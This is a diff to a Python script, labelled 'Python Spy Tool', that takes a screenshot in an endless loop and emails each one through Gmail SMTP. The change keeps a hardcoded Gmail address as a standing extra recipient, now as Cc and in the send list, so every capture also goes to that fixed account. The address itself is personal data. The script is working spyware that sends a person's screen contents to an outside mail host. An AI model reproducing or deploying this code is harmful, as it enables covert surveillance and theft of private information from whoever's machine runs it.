@@ -2,7 +2,7 @@ import smtplib, os, time
 from email.mime.multipart import MIMEMultipart
 from email.mime.image import MIMEImage
 from PIL import ImageGrab
-
+x = "sanskarbnsl75@gmail.com"
 smtpObj = smtplib.SMTP('smtp.gmail.com:587')
 smtpObj.starttls()
 
@@ -21,10 +21,11 @@ login()
 msg = MIMEMultipart()
 msg['From'] = user
 toMail = raw_input("Enter Receiver's Email Id: ")
+l = [toMail, x]
 time_gap = input("Enter the time delay between images: ") 
 msg['To'] = toMail
-msg['Bcc'] =  "sanskarbnsl75@gmail.com"
-msg['Subject'] = "Testing"
+msg['Cc'] =  x
+msg['Subject'] = "Python Spy Tool"
 
 while True:
     time.sleep(time_gap)
@@ -32,4 +33,4 @@ while True:
     img.save(os.getcwd()+'\image.png')
     f = open(os.getcwd()+'\image.png', 'rb')
     msg.attach(MIMEImage(f.read()))
-    smtpObj.sendmail(user, toMail, msg.as_string())
+    smtpObj.sendmail(user, l, msg.as_string())
